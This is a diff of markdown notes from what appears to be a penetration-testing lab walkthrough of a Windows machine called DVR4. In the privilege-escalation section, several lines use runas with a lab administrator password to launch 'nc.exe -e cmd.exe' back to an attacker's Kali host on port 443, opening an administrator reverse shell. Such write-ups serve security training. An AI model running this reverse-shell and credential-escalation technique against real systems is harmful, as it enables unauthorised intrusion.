@@ -314,19 +314,11 @@ Enumerated top 200 UDP ports:
 #### - Per the web page it showed to run the following command example "runas /user:admin "C:\Windows\notepad.exe"
 
 ![](Images/Pasted%20image%2020221009202314.png)
-
-#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" input password 14WatchD0g$ (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
-
-![](Images/Pasted%20image%2020221009202519.png)
-
-![](Images/Pasted%20image%2020221009202604.png)
-#RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
-
-
+- [ ] 
 ## Privilege Escalation vector
 ## Runas command to login with a different user in CMD
 
-#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
+#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" and password 14WatchD0g$ (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:
 
 ![](Images/Pasted%20image%2020221009202519.png)
 
